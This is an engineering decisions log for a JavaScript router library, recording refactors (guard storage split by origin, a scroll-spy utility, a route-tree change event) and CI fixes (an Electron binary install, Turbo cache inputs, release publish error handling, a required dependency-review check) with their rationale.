**Severity re-classification.** The audit's "CRITICAL CVE-class data leak / GHSA advisory" framing did not survive review (no remote vector, documented behaviour, broken proposed fix). Re-labelled LOW (documentation enhancement). Issue #664 was closed with doc-only changes; no `isolateDeps` flag, no auto-`structuredClone`, no DEV warning (mutable values in deps are normal — DB clients, EventEmitters, Maps).

## `RouteLifecycleNamespace` factory storage split by origin (#661)

### Problem

Guard factories (`canActivate` / `canDeactivate`) had two possible origins:

- **Definition** — declared on the route config: `{ name: "admin", canActivate: ... }`. Subject to `clearDefinitionGuards()` cleanup during `replace()`.
- **External** — registered post-hoc via `getLifecycleApi().addActivateGuard(name, ...)`. Survives `replace()`.

Storage was a single `Map<string, GuardFnFactory>` per kind plus an auxiliary `Set<string>` per kind tracking which slots came from definitions. Origin was a derived, Set-tracked property — every read had to consult both the Map and the Set to reconstruct it. That layout had three follow-on quirks: `removeActivateGuard` could not distinguish origins (the Set was for HMR cleanup, not for the public API), an external add over an existing definition cleared the Set entry without any signal that the original definition guard was being shadowed, and `cloneRouter`'s `getFactories()` returned a flat record so clones lost origin entirely (every guard re-registered as external).

The original audit (`route-lifecycle-deep-2026-05-22.md` + `clone-router-deep-2026-05-22.md`) framed these as four CRITICAL bugs closing a "CVE-class data leak vector". After running every probe and tracing the call paths, none of the claims survived as CRITICAL — the closure-sharing claim in particular is a documented usage rule (#664-shaped: singletons on base, per-request on clone) that this refactor cannot address regardless of storage layout. Re-classified LOW (code-quality refactor); see issue #661 for the full re-evaluation table.

### Solution

Lift origin to a primary structural invariant by splitting storage into four factory Maps:

```
#definitionActivateFactories     #externalActivateFactories
#definitionDeactivateFactories   #externalDeactivateFactories
```

Each `add*` call lands in exactly one of these Maps according to the `isFromDefinition` flag. The compiled-function view (`#canActivateFunctions` / `#canDeactivateFunctions`, one Map per kind) keeps the pre-refactor **last add wins** runtime semantic, preserving the `replaceRoutes: definition wins on replace` contract. On partial clear, the compiled function falls back to whichever origin Map still holds the slot.

Public namespace surface (consumers inside core):

- `clearCanActivate(name, origin?)` / `clearCanDeactivate(name, origin?)` — optional `"definition"` / `"external"` filter. Default (no filter) keeps the pre-refactor behaviour of clearing both slots.
- `getFactoriesByOrigin(): { definition: [d, a]; external: [d, a] }` — used by `cloneRouter` to re-register each kind with the original `isFromDefinition` flag preserved. Subsequent `replace()` on the clone now correctly strips inherited definition guards.
- `getFactories(): [d, a]` — backward-compatible flat shape (external wins on duplicate slot). Used by `getRoutesApi` consumers (`enrichRoute`, route-removal cleanup, the `auto-cleanup` test) without modification.
- `clearDefinitionGuards()` — iterates `#definitionActivate*` keys; only deletes the compiled function for slots that lack a surviving external entry, otherwise the external function stays in place.

`cloneRouter` was rewired to call `getFactoriesByOrigin()` instead of the flat `getLifecycleFactories()`: definition factories are registered via the namespace directly with `isFromDefinition=true`, external factories flow through the public `lifecycleApi.addActivateGuard` / `addDeactivateGuard` path. The public lifecycle API surface — `removeActivateGuard(name)` / `removeDeactivateGuard(name)` — is unchanged; wiki and JSDoc do not need updates.

### Why

**Origin becomes a property of where the factory lives, not a derived flag.** Set-tracked origin made every consumer (cloneRouter, replace, clearDefinitionGuards) reconstruct the intent from two data structures. With split Maps, "is this a definition guard?" is `definitionActivateFactories.has(name)` — one lookup, no reconstruction.

**Clone semantics become predictable.** Before: `cloneRouter` lost origin, so a `replace()` on a clone couldn't strip inherited definition guards. After: clones round-trip origin and behave identically to the base under `replace()`.

**Enables future API tightening without re-touching internals.** Once the team decides whether `removeActivateGuard` should default to "external only" (cleaner public contract — currently ambiguous in the wiki), the change is one line at the API site: `lifecycleNamespace.clearCanActivate(name, "external")`. Without this refactor, the same API change would require introducing origin-aware storage as part of the same PR.

### Non-goals

- **Closure-sharing across clones (audit Bug #2 / clone-router #2)** — not addressed and cannot be addressed by factory storage layout. A guard factory registered on the base with closure over per-request state is shared by reference with every clone regardless of how the factories are filed. The fix is documentation (singletons on base, per-request state on the clone via the override slot or `createRequestScope`), tracked under #664 for dependencies and applicable to guards verbatim.
- **`removeActivateGuard` semantics** — unchanged. Default clear of both origin slots is preserved so this PR is a pure refactor at the public surface. Tightening to "external only" is a separate API-contract decision.

## Scroll Spy via Forced Same-States Transition (#575)

### Problem

Long-form pages with anchored sections want the URL bar to reflect the currently-visible section — bookmarkable, share-able, and to drive sibling `<Link hash>` highlights for a TOC sidebar. Userland packages (`react-waypoint`, `react-scrollspy`, `vue-scrollactive`) solve this by writing `history.replaceState({}, "", "#section")` directly, which updates the URL bar but **bypasses the router**: `state.context.url.hash` stays stale, hash-aware `<Link>` components don't re-highlight, and analytics/loaders subscribed to `router.subscribe` miss the change. The category is also stagnant — ~2M downloads/mo across packages whose median last release is > 5 years.

A scroll-spy plugin layered into the transition pipeline is the wrong shape: `IntersectionObserver` is a DOM concern, the spy doesn't participate in guard / activation phases, and routing-core is intentionally DOM-agnostic. The same rationale that put `createRouteAnnouncer` / `createScrollRestoration` / `createViewTransitions` into `shared/dom-utils/` applies.

### Solution

Added `shared/dom-utils/scroll-spy.ts` exposing `createScrollSpy(router, options)`. On `IntersectionObserver` notifications the utility picks the topmost visible anchor inside the configured scroll container and emits

```ts
router.navigate(state.name, state.params, {
  hash: newHash,
  replace: true,
  force: true,
  hashChange: true,
});
```

This is a **forced same-route same-params transition** with `hashChange: true`:

- `force: true` bypasses core's `SAME_STATES` short-circuit (name+params didn't change).
- `hashChange: true` signals URL plugins (`browser-plugin` / `navigation-plugin`) to write `state.context.url = { hash: newHash, hashChanged: true }` in their `onTransitionSuccess` claim.
- `replace: true` keeps `state.transition.replace === true` portable across both URL plugins so [`createScrollRestoration`](../shared/dom-utils/scroll-restore.ts) skips magnetic-snap on spy-emitted transitions (foundation #648).

Same write API as `<Link hash>` click via `navigateWithHash`, just with `replace: true` so the spy doesn't pollute history with one entry per visible section.

Each framework adapter wires the utility to a `scrollSpy?: ScrollSpyOptions` prop on `RouterProvider` (Angular: options bag on `provideRealRouter` / `provideRealRouterFactory`). Lifecycle is tied to the provider — created on mount, destroyed on unmount.

### Why not `replaceHistoryState` directly?

The userland approach writes `history.replaceState({}, "", "#section")` and calls it a day. This updates the URL bar but does **not**:

1. Update `state.context.url.hash` (which is plugin-domain, claimed via `claimContextNamespace`).
2. Notify `router.subscribe` listeners — analytics tracking section visibility never fires.
3. Re-trigger `createActiveRouteSource` for sibling `<Link hash>` — TOC highlights stop matching scroll.
4. Run lifecycle-plugin's `onStay` / `onNavigate` callbacks (same-route hash-only navigations).

Routing through `router.navigate(...)` keeps the entire transition pipeline aware of the hash change. For same-route same-params transitions, [`getTransitionPath`](../packages/core/src/transitionPath.ts) returns empty `toDeactivate` / `toActivate` arrays — `runGuards` is a no-op. The only work is the URL plugin's `onTransitionSuccess` write and the `getTransitionSource` flip — cheap.

### Anti-flicker mechanisms

`scrollIntoView({ behavior: "smooth" })` after a `<Link hash>` click animates **after** `TRANSITION_SUCCESS` — `isTransitioning` is already `false`, intermediate IO events during the smooth scroll would emit spurious `router.navigate(...)` calls, and the URL bar would flicker through `#section-2 #section-3 #section-4` before landing on `#section-5`. Three composing gates close the loop:

1. **`isTransitioning` gate** — via `getTransitionSource(router)` (per-router cached, eager subscription, auto-resets on success/error/cancel). Skips emits while a transition is in-flight.
2. **`coolingDown` gate** — set on a user-driven hash transition (e.g. `<Link hash>` click + smooth `scrollIntoView`). Cleared on the `scrollend` event (Baseline 2026: Chrome 114+, Firefox 109+, Safari 17+) or a 500 ms safety timeout. IO events during the smooth animation are silenced.
3. **`selfEmitting` guard** — set synchronously around the spy's own `router.navigate(...)` call. Without it the spy's own `router.subscribe` callback would see `hashChanged: true` and re-enter the cooldown setup, rate-limiting the spy to ≤ 2 emits/s and contradicting the ≤ 10 emits/s acceptance target.

### Why `createScrollSpy`, not `useScrollSpy`

A hook would require six adapter-specific surfaces; the utility shape requires zero adapter API and slots into the existing `RouterProvider` prop pattern used by `scrollRestoration` / `viewTransitions` / `announceNavigation`. Hash-plugin / memory-plugin / no-URL-plugin runtimes detect missing `state.context.url` at init (or via a one-shot subscriber if the router isn't started yet) and degrade to a `NOOP_INSTANCE` with a single dev-only warn — same defensive shape as `createScrollRestoration` under non-DOM runtimes.

### Why not opt-out the spy via a separate `@real-router/hash-events-plugin`

`hashChanged: true` is symmetric on the bus: every subscriber — `router.subscribe`, `lifecycle-plugin.onStay` / `onNavigate`, `createActiveRouteSource` — sees the spy's emit identically to a user-driven `<Link hash>` click. Consumers who want to ignore hash-only transitions filter at the call site (`if (route.context.url?.hashChanged) return;`). Declarative filtering via a route-config field (`onHashChange`) is a separate plugin scoped to demand evidence; not in this RFC.

## Example e2e runs to completion despite failures (#694)

### Problem

The scheduled `Examples` workflow runs every example's Playwright suite via a single `pnpm turbo run test:e2e --filter='./examples/**' --concurrency=1`. Turbo's default (`--continue=never`) cancels all remaining tasks the moment one fails, so a single broken example aborted the sweep and the job log listed only the **first** failing example — any other red examples stayed invisible until the next run. While triaging #694 (scroll-restoration regression) the run stopped at the first failure, so a single log could not tell whether other examples were also broken.

### Solution

Pass `--continue=dependencies-successful` on the e2e job only:

```yaml
run: pnpm turbo run test:e2e --filter='./examples/**' --concurrency=1 --continue=dependencies-successful
```

Every example whose build succeeded now runs its specs regardless of sibling failures, so a single CI run yields the **complete** list of failing e2e tests. The aggregate task still exits non-zero, so the job stays red on any failure — this changes the log, not the gate.

### Why only e2e, not the unit pipelines

`ci.yml` / `post-merge.yml` run the library unit + property tests, where vitest already reports every failure within a package and fail-fast across the package graph is the right default (faster red on a real regression). The aggregation problem is specific to the ~90-example e2e sweep, where a per-example abort discards the rest of the matrix. `dependencies-successful` (not `always`) is deliberate: it does **not** run an example's e2e when that example's own build failed — those are surfaced by the build job, not drowned in Playwright connection errors against a missing `dist/`.

## Routes Mutation Event Surface — internal `TREE_CHANGED` channel (#702)

### Problem

`getRoutesApi(router)` exposes five route-tree mutations — `add` / `remove` / `update` / `replace` / `clear` — none of which emitted any signal. The seven existing router events are all about **transitions** (`ROUTER_START`, `TRANSITION_*`), so a plugin or infrastructure consumer that maintains state derived from the tree (DevTools, microfrontend coordinators, file-routes watch, caches keyed by route name) had no way to learn the tree had changed without a navigation. The only existing hook was `addInterceptor("add", ...)`, which covered `add` alone — `update`/`remove`/`replace`/`clear` were silent. The fragmented workarounds were polling in `onTransitionStart` (misses no-navigate mutations) or wrapping CRUD via `extendRouter` (breaks `getRoutesApi` invariants).

### Solution

A **post-commit, fire-and-forget** event `TREE_CHANGED`, emitted after each structural mutation, observed through a single entry point: **`getRoutesApi(router).subscribeChanges(handler)`**.

- **Payload** — a discriminated union (`@real-router/types` → `TreeChangedEvent`) keyed by `op`. `add`/`replace` carry a FLAT `added` (full dotted names, descendants included); `remove` carries `removedSubtree`; `clear`/`replace` carry `removed`; `update` carries a `patch` of structural fields only. `update` emits **only** when the patch contains a structural field (`forwardTo` / `defaultParams` / `encodeParams` / `decodeParams`) — guard-only and empty patches are silent (guards are invoked-on-demand, not cached, so they need no observation channel).
- **Reuses the existing `EventEmitter`** through an **internal-only** key. `"TREE_CHANGED"` is added to the internal `RouterEventMap` (`core/src/types.ts`) but deliberately kept OUT of the public `EventName` union, `events.*` registry, and `Plugin` interface. Three `RouterInternals` accessors (`emitTreeChanged` / `subscribeTreeChanged` / `treeChangedListenerCount`) bridge `getRoutesApi` to `EventBusNamespace`, because the public `addEventListener<E extends EventName>` structurally rejects a key that is not in `EventName`. Depth tracking (`maxEventDepth = 5`) and per-listener error isolation (`onListenerError`) therefore apply for free; `RecursionDepthError` is now exported from `@real-router/event-emitter` and re-exported from `@real-router/core` so callers can `instanceof`-check the one error that escapes a handler.
- **Wrapper-level emission only.** Emission lives in the five public `getRoutesApi` wrappers, never in the shared internals (`adoptRouteArtifacts`, `commitTreeChanges`, `resetStore`) that `dispose()` / `cloneRouter()` / `setRootPath()` also call — so teardown and cloning stay silent. For `replace`, the event fires via an `onCommitted` callback threaded into the internal `replaceRoutes`, between the tree swap and state revalidation (handler sees the new tree, the still-old state).
- **Conditional payload construction.** All five wrappers gate payload building on `treeChangedListenerCount() > 0`, so a tree with no subscribers pays O(1) on the mutation path. `add` builds its payload from the input array in O(added); `replace` diffs before/after flat maps; `remove`/`clear` snapshot before the mutation.
- **Cleanup of the dead `add` interceptor.** Once `search-schema-plugin` migrated to `subscribeChanges`, `addInterceptor("add")` had no consumers, so the `interceptableAdd` wrapper and the `add` key in `InterceptableMethodMap` were removed (first interceptor type retired via subscription migration).

### Why

**Single entry point, no facade method.** `router.subscribeTree()` and `api.addEventListener(events.TREE_CHANGED)` were both rejected. Tree mutations are an **infrastructural** concern (DevTools, plugin coordination), not an app-level event — app code observes external state (auth/role/flags) that *triggers* mutations, plus `router.subscribe` for navigation. Exposing a second entry point through `addEventListener` was also structurally impossible without growing the plugin surface (a new `Plugin.onTreeChange` method + `EventName` extension), which is exactly the surface the RFC set out to avoid.

**Payload immutability without hostile cloning.** Payload routes are core-built and frozen per node (Invariant 4's "tree-built references" model), not deep clones of caller input — deep-cloning the `update` patch broke `update()`'s existing contract (circular refs / class instances in `defaultParams`, getter re-invocation). The `update.patch` is a fresh frozen envelope built from the already-destructured locals; nested values are by reference.

**Consumer guidance.** The recommended way to consume `TREE_CHANGED` — declarative `switch (event.op)` in the cache owner's constructor, per-cache subscription, no centralized `CacheManager` — is documented in [packages/core/CLAUDE.md](packages/core/CLAUDE.md) ("Recommended pattern: declarative reactive cache invalidation"). Consumers migrated: `search-schema-plugin` (closes a real `update`/`replace` validation gap), `preload-plugin` and `lifecycle-plugin` (evict route-keyed compiled caches for removed routes; preload additionally invalidates its href-keyed pre-resolved `State` cache to prevent `getPreloadedState` from returning a snapshot for a removed route). `ssr-data-plugin` / `rsc-server-plugin` were intentionally not migrated — their compiled map is derived from the developer-provided `loaders` config, not the tree, so a tree mutation never makes a loader stale.

## Electron e2e: explicit binary install in CI (`examples.yml`)

### Problem

The scheduled **Examples** workflow's E2E job failed every run on all three `desktop/electron/*` examples with `electron.launch: ENOENT: no such file or directory, open '…/electron/path.txt'`. Playwright's `_electron.launch` resolves the Electron binary through `path.txt`, written by Electron's `postinstall` (`install.js`) after it downloads + extracts the binary. The file was simply not there.

### Solution (current — curl + unzip in bash, #812)

Added an **Install Electron binary** step to the `e2e` job (after `playwright install`) that runs `scripts/ci-install-electron.sh`, plus an `actions/cache` step for the downloaded zip:

```yaml
- name: Cache Electron binary
  uses: actions/cache@v5
  with:
    path: ~/.cache/electron-zip
    key: electron-zip-${{ runner.os }}-${{ hashFiles('examples/desktop/electron/*/package.json') }}
    restore-keys: electron-zip-${{ runner.os }}-

- name: Install Electron binary
  run: bash scripts/ci-install-electron.sh
```

The script resolves the shared `.pnpm/electron@X` dir, downloads `electron-v<ver>-linux-x64.zip` with **curl** (a blocking subprocess), verifies sha256 against electron's own `checksums.json`, `unzip`s it into `dist/`, writes `path.txt`, and asserts `dist/electron` + `path.txt` exist. All three electron examples share one `.pnpm/electron@42.3.3`, so one install covers all. The zip is cached so repeat runs skip the ~128 MB download; the script self-heals on a stale/corrupt cache (checksum re-verify → re-download).

**Hardening follow-up (post-review, #812):**

- **Platform guard** — the script refuses to run on anything but `Linux/x86_64`. The zip name, the `path.txt` payload (`electron`), and the unzip layout are linux-x64 specific: running it locally on macOS would wipe the native `dist/` and install a foreign binary (recoverable only by re-running electron's own `install.js`); on a future arm runner it would silently install an x64 binary that can't exec.
- **Cache key = electron examples' manifests, not `pnpm-lock.yaml`** — the lockfile changes with every dependency bump (weekly dependabot churn), and each new key mints a new immutable ~128 MB cache entry, pressuring the 10 GB LRU quota shared with the pnpm store cache. `examples/desktop/electron/*/package.json` only changes when the electron examples themselves do.
- **Prune stale zips** — `restore-keys` restores the previous cache directory; after an electron bump the old `electron-v*.zip` would otherwise ride along into every newly saved entry (+~128 MB per bump). The script deletes zips that don't match the current version after a successful verify.
- **One full re-download on checksum mismatch** — `curl --retry` does not cover a truncated `200 OK` body; a single retry absorbs one flaky transfer instead of failing the twice-weekly run.

#### Why two earlier fixes failed (both superseded)

1. `node "$(… require.resolve('electron/install.js'))"` — re-ran electron's own installer.
2. A Node wrapper (`scripts/ci-install-electron.cjs`) that `await`ed `@electron/get`'s `downloadArtifact → extract → writeFile('path.txt')` with a postcondition assert.

Both failed the **same** way on the ubuntu runner: the install step exited **0 after printing only the first log line**, with no `path.txt` written and the postcondition guard never reached — a green step that installed nothing, so `_electron.launch` still threw `ENOENT … path.txt`. Root cause: `@electron/get`'s download does **not keep the Node event loop alive** on this runner, so the process drains and exits 0 **at the `await`** — `await` cannot keep a process alive for a promise that schedules no libuv work. (`electron/index.js:47` reads `path.txt` outside its `try`, turning the missing file into the launch ENOENT.) Locally on macOS the same download *does* keep the loop alive (verified: a forced cache-miss download stayed running >6 s), so the race was invisible there — which is exactly why a Node-based fix can't be trusted for this. The bash version removes Node from the download path entirely: `curl` blocks under `set -e`, and the postcondition is a `[ -f ]` test that always runs. `pnpm rebuild electron` / `pnpm rebuild -r electron` do **not** help — electron is not a direct dependency of any workspace root pnpm will match, so they no-op.

#### Second layer: headless runner has no display (xvfb)

Once the binary actually launched (curl fix above), a **different** failure surfaced — previously masked by the missing `path.txt`: Electron is a GUI app and the runner is headless, so it died on platform init:

```
[ERROR:ui/ozone/platform/x11/ozone_platform_x11.cc:257] Missing X server or $DISPLAY
[ERROR:ui/aura/env.cc:246] The platform failed to initialize.  Exiting.
<process did exit: signal=SIGSEGV>
```

`_electron.launch` then reported `Process failed to launch!` (or timed out before `firstWindow`). Fix: run the whole e2e step under **`xvfb-run`** (Xvfb is preinstalled on ubuntu-latest), with `-screen 0 1280x1024x24` (Chromium needs ≥24-bit depth; the xvfb-run default is 8-bit):

```yaml
- name: Run E2E tests
  run: >-
    xvfb-run -a --server-args="-screen 0 1280x1024x24"
    pnpm turbo run test:e2e --filter='./examples/**' --concurrency=1 --continue=dependencies-successful
```

Web examples run headless Chromium and ignore the virtual display; only the electron examples need it. Wrapping at the CI level (not in the examples' own `test:e2e` scripts) keeps the examples cross-platform — a developer on macOS/Windows still runs them against the native display.

### Why the postinstall is skipped (and a CI step is the right fix)

`electron` is in root `pnpm.onlyBuiltDependencies`, so its build script is approved. But its side effects — the binary under `~/.cache/electron` and `path.txt` in `node_modules` — are **not** captured by `cache: pnpm` (which only caches the pnpm store, not `node_modules` or `~/.cache`). pnpm 10 records a per-package "built" flag in the store; on a warm-store runner it sees electron as already built and skips re-running `install.js` into the fresh `node_modules`, so `path.txt` never reappears. Verified locally: deleting `dist/` + `path.txt` and re-running `pnpm install --frozen-lockfile` does **not** regenerate them, while running `install.js` directly does. An explicit install step is deterministic regardless of store-cache warmth. (The Electron tests themselves are healthy — they pass locally once the binary is present.)


## Turbo hashes `shared/` symlink content via a carpet glob (#810)

### Problem

The `shared/{browser-env,dom-utils,ssr}` source trees are symlinked into 10 public packages (`src/browser-env`, `src/dom-utils`, `src/shared-ssr`) plus the two owner packages `browser-env` / `dom-utils` (whose entire `src` is the symlink). Turbo hashes inputs through git, and **git stores a symlink as a blob containing the target path** — the bytes on the other side never enter the package hash, and a `src/**/*.ts` glob does not traverse the link. So `shared/` was invisible to every task's input hash:

- A PR touching **only** `shared/browser-env/*` (or `ssr/*`) matched no task input of any package; `@real-router/shared-sources` has no scripts → **0 tasks ran** → `CI Result` green with no build and no tests. Shipped code merged unbuilt/untested.
- On any shared change, consumers' `test`/`lint`/`type-check` replayed **stale cache** (only `bundle` saw `dom-utils` via a single root glob). Owner-measured coverage (#809) silently used pre-change lcov.
- Process gates were blind too: `changeset-check.yml` (`^packages/<public>/src/`) and `dangerfile.ts` (`/^packages\/.*\/src\//`) didn't match `shared/`, so shipped-code changes needed no changeset and triggered no Danger.

### Solution

Add a carpet glob `../../shared/**/*.ts` to the root `bundle`, `test`, `lint`, and `type-check` task inputs (replacing the narrower `../../shared/dom-utils/**/*.ts` that was bundle-only). Plus the process gates: a shared-source pattern in `changeset-check.yml`'s `SOURCE_CHANGED`, and in `dangerfile.ts`'s `SOURCE_PATTERNS`.

**Gate patterns are narrowed to `.ts` (post-review):** the first cut used a bare `^shared/`, which also matched `shared/dom-utils/CLAUDE.md`, `shared/.claude/*.md`, and `shared/package.json` — a docs-only PR under `shared/` would fail the **required** `Require Changeset` check (and the "add #trivial" hint in its error message is dead text — only Danger implements `#trivial`, the required check does not). Both gates now use `shared/<dir>/…*.ts` excluding `__test-helpers/` (test-only, never bundled), mirroring the turbo glob: turbo says docs don't invalidate, so the changeset gate must not say docs need a release. `.ts`-only is correct by design — `shared/` is framework-agnostic by definition, so framework-specific extensions (`.tsx`/`.vue`/`.svelte`) cannot appear there.

**Angular copy drift-guard (post-review):** the carpet glob leaves one residual: `packages/angular/src/dom-utils` is a git-tracked *copy* re-materialized from `shared/dom-utils` by `prebundle` (`scripts/sync-dom-utils.mjs` — not a plain copy: skips `__*` dirs, rewrites `./x.js` imports to bare). A `shared/dom-utils` PR that forgets `pnpm -F @real-router/angular bundle` would ship an angular dist built from fresh shared (prebundle runs in CI) while angular's tests exercised the stale committed copy — green CI, untested dist. The `pipeline` job now re-runs the sync script right after install (dependency-free, <1s) and fails via `git status --porcelain` (not `git diff` — newly added shared files appear as untracked in the copy) when the committed copy is out of date.

Verified: a working-tree change to `shared/ssr/createSsrLoaderPlugin.ts` now yields a **non-empty** affected graph (565 `test` tasks incl. both `ssr-data-plugin` and `rsc-server-plugin` across all four tasks); each consumer type sees its shared files in `bundle`/`test`/`lint`/`type-check` (`--dry=json`).

### Why a carpet glob, not per-package `turbo.json`

The audit (#810) first proposed per-package `turbo.json` (`extends: ["//"]`) adding only each consumer's own shared glob, for precise invalidation. Empirically rejected: **package-level `inputs` _replace_ the root array, they don't merge** (and `$TURBO_DEFAULT$` changes the input set), so each of 12 packages × 4 tasks would have to **restate the full root input list** + the shared glob — 48 duplicated arrays that silently drift (under-hashing) the moment a root input changes, and would need a dedicated drift-guard to police. That is a fresh instance of the exact "list-drift" class the audit decries.

The carpet glob has **no consumer list anywhere** → structurally drift-free, no guard needed. Cost: a `shared/` change now cache-misses every package's four tasks, not just consumers. Accepted because (a) `shared/` is stable infra that changes rarely, (b) it merely completes the over-invalidation the repo already lived with for `dom-utils#bundle`, and (c) when `shared/dom-utils` does change, the adapters *should* rebuild anyway. `packages/angular` is unaffected — it consumes a git-tracked **copy** of `dom-utils` (real files, hashed via `src/**`), re-synced by its `prebundle` script.

## Release: `changeset publish` failure no longer masked by `|| true` (#811)

### Problem

`changesets.yml`'s publish step ran `OUTPUT=$(pnpm changeset publish 2>&1) || true`, then derived the step's fate from a downstream tag-grep — not from the publish itself. So the step's success/failure was decoupled from whether the release actually happened:

- **Partial publish** (npm 5xx / OIDC hiccup on a subset; some packages publish, others fail): the published ones print `New tag:` lines → the grep succeeds → step **green**, with the failure silently dropped. Maintainer believes the version shipped; npm is missing packages. Self-heal only on the next push to `master` (re-detects `has_unpublished`), possibly days away.
- **Total failure was green too.** The step declares no `shell:`, so it runs under the Actions default `bash -e {0}` — **without pipefail** (pipefail is only added with an explicit `shell: bash`). In `… | grep "New tag:" | sed …` the no-match grep's exit 1 is masked by the trailing `sed` (exit 0), the assignment succeeds with an empty string, and the step survives. Verified in both shell modes: survives under `bash -e`, aborts only under `bash -eo pipefail`. (An earlier revision of this note claimed total failure went red "by accident" via pipefail — wrong, that verification ran in a pipefail shell the workflow doesn't use.)

### Solution

Capture the publish exit code explicitly and enforce it **last**, after tags/Releases for whatever did publish are pushed:

```bash
set +e
OUTPUT=$(pnpm changeset publish 2>&1)
PUBLISH_STATUS=$?
set -e
echo "$OUTPUT"
echo "publish_status=$PUBLISH_STATUS" >> "$GITHUB_OUTPUT"
NEW_TAGS=$(echo "$OUTPUT" | grep "New tag:" … || true)   # never aborts on no-match
```

- `Push git tags` and `Reconcile GitHub Releases` run as before (so a partial publish still records the packages that succeeded).
- New final step `Fail if publish errored` — `if: always() && publish_status != '' && publish_status != '0'` → `exit 1`. Skipped on the Release-PR path (publish didn't run → output `''`) and on success (`'0'`).
- `Summary` is now `if: always()` and reports the **actual** status (`❌ Publish FAILED …` vs `📦 Published packages`), not the plan.

### Why

A red run on a partial publish is the desired outcome — a human re-runs the workflow (publish is idempotent: already-published versions are skipped, `Reconcile` backfills missing Releases), which is far cheaper than a silent under-release discovered later. The `|| true` was originally there to let the tag-push fallback run even when `changeset publish` swallowed a `git tag` failure (changesets#1621); that intent is preserved — tags/Releases still push on a non-zero publish — but the error signal is no longer thrown away with it.

### Post-review hardening

- **Summary guard for early aborts** — `Summary` is `always()`, so when the job dies before "Check for changesets" its output is `''` and a bare `[ "" != "0" ]` is true, falsely printing "Release PR created/updated". An explicit empty-check now reports "Run aborted before the changeset check" instead.
- **Failure post-mortem names the gap** — `Fail if publish errored` lists the planned packages whose local version is still absent from npm (same local-vs-npm comparison as the unpublished check) in the `::error::` and the step summary, instead of "see the log". When everything IS on npm despite the non-zero exit, it says so (post-publish error — tagging/changelog) and points at re-run-to-reconcile.
- **`timeout-minutes: 30` on the release job** — a hung npm/OIDC exchange would otherwise hold the job for the 6h default and, with `cancel-in-progress: false`, block every queued release behind it. Typical runs are 3-8 min.
- **Reconcile backfills missing *tags*, not just Releases** — the last unrecoverable partial state was "npm published, tag push failed": the next run sees local==npm → `has_unpublished=false` → publish path skipped, and the Release reconcile only covered *existing* tags. Now, for every public package at HEAD whose local version is on npm (`npm view name@version`, checked only when the tag is missing — zero calls in steady state) but whose tag is absent, the tag is created at HEAD via `gh api …/git/refs` (the checkout has `persist-credentials: false`, so plain `git push` can't; the API works with the workflow's `contents: write` GITHUB_TOKEN) and mirrored locally so the same run's Release passes pick it up.

## `Dependency Review` is a required check; CodeQL gating moved to head-ref (audit 1.1/3.1)

### Problem

The supply-chain gate was advisory. `protect-master` required only `Require Changeset`, `CI Result`, `Validate Changesets` — all *functional*. `Dependency Review` (`codeql.yml`, `fail-on-severity: moderate`) and CodeQL `Analyze` were not required, so a PR introducing a moderate-severity vulnerable dependency could merge green. For **Dependabot automerge** this is not hypothetical: `gh pr merge --auto` fires on the *required* checks only, and `semver-patch` (any dep) / `semver-minor` (dev) bumps could pull a vulnerable transitive without blocking.

Naively adding `Dependency Review` to the required set would have **deadlocked release PRs**: `codeql.yml` had a workflow-level `paths-ignore: ["**/package.json", "**/CHANGELOG.md", ".changeset/**"]`, and a `changeset-release/*` PR changes only those paths → the whole workflow is skipped at the `on:` level → the required check *never reports* → the PR blocks forever on a pending check (GitHub does not auto-satisfy a required check whose workflow was skipped by a path/branch filter).

### Solution

- **`codeql.yml`: drop the workflow-level `paths-ignore`; gate by head-ref at the job level** (mirrors the danger.yml pattern from `80f0ff62`):
  - `dependency-review`: `if: github.event_name == 'pull_request' && !startsWith(github.head_ref, 'changeset-release/')`.
  - `analyze`: `if: github.event_name == 'schedule' || !startsWith(github.head_ref, 'changeset-release/')`.
  A job skipped by `if:` (workflow *did* trigger) reports a **"skipped" conclusion**, which branch protection treats as a **pass** — so a release PR satisfies the required `Dependency Review` without running it, no deadlock. Dependabot dep PRs change `pnpm-lock.yaml` (never matched the old ignore), so they kept running and keep running.
- **Ruleset `protect-master`: add `Dependency Review` to `required_status_checks`** (integration_id 15368, GitHub Actions). CodeQL `Analyze` stays advisory — SAST on a router library is low-signal and autobuild occasionally flakes; the supply-chain gate is the one worth enforcing.

### Why / ordering

The required-check change is only safe once the head-ref-gated `codeql.yml` is **live on master** — otherwise master's old `paths-ignore` skips the workflow on a release PR and the required check can't report. Land (push) the workflow commit before the next release cycle; until then a release PR would need a one-time maintainer ruleset bypass (`bypass_actors` already grants it). The "skipped job ⇒ required check passes" semantics is the documented conditional-required-check pattern but should be eyeballed on the first release PR after this lands.

Also fixed alongside: the `sonarqube-scan-action` pin comment said `# v7` while the SHA is `v8.2.0` (Dependabot bumped the SHA, comment drifted) — corrected to `# v8.2.0`.

## Stryker self-alias must match the package name; mutation testing extended to core's foundation deps

> **Superseded in part:** the manual workspace-**dep** aliases set up here for `logger-plugin` and `rx` (and called "inert"/"correct" below) were later found to silently understate those packages' scores. See "Mutation testing: explicit `plugins` + dep resolution via `internal-source` condition" below. The **self**-alias guidance in this section still stands.

### Problem

`pnpm -F @real-router/logger test:mutation` (`stryker run`) failed, while `@real-router/core`'s ran fine. The standalone `vitest.stryker.config.mts` aliased the bare key `logger` → `./src`, but the package is published/imported as `@real-router/logger` and every logger test imports `from "@real-router/logger"`. Vite/Vitest match aliases by module-id prefix segments, not substring (`"@real-router/logger".startsWith("logger")` is `false`), so the alias never fired. The **self-alias is load-bearing**: it redirects the package-under-test's own imports to the sandbox-mutated `src/`. With it dead, `@real-router/logger` resolved via the node_modules self-symlink → `exports.import` → unmutated `dist/`, so the mutated sandbox `src/` was never executed → every mutant survived → score ≈ 0% → below `thresholds.break: 60` → Stryker exits non-zero. The failure mode is silent degradation ("all mutants survive"), not a crash — easy to mistake for a tooling problem. This was a copy-paste slip when templating from core (`"@real-router/core"` got mis-renamed to bare `logger`).

Separately, several packages down core's foundation chain had no mutation testing at all: `@real-router/fsm` and `event-emitter` (direct deps of core) and `path-matcher` (the segment-trie matcher behind `path-matcher → route-tree → core`). `@real-router/types` is type-only — nothing to mutate.

### Solution

- **logger:** alias key `logger` → `"@real-router/logger"` (one line). Audited the other five stryker packages (`core`, `route-tree`, `type-guards`, `search-params`, `logger-plugin`) — their self-aliases all match their package names (the bare-named internal packages are genuinely named `route-tree`/`type-guards`/`search-params`; `logger-plugin` is scoped and correct). `logger-plugin` carries a dead **dep**-alias on bare `logger`, but nothing imports `@real-router/logger` there, so it's an inert no-op — left as-is.
